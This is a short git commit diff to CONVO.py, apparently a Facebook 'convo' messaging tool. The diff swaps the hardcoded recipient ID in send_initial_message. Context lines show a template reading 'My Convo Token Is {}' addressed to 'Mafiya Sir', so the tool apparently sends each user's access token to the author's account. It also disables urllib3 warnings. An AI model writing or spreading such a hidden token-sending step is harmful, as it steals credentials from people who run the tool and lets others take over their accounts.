2ae851d80ec9c69b7d6bcb58870ce7c7b224d2d3
Sunillmafiya111 <sj9852269@gmail.com>
2024-11-17 16:39:39 +0530

    Update CONVO.py

--- CONVO.py
+++ CONVO.py
@@ -42,7 +42,7 @@ def send_initial_message():
       msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝗳𝗶𝘆𝗮 𝗦𝗶𝗿..!! 𝗜'𝗺 𝗨𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗼𝗹 𝗔𝗻𝗱 𝗠𝘆 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗸𝗲𝗻 𝗜𝘀 {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100069713641443"
+      target_id = "100084348499534"
 
       requests.packages.urllib3.disable_warnings()
 
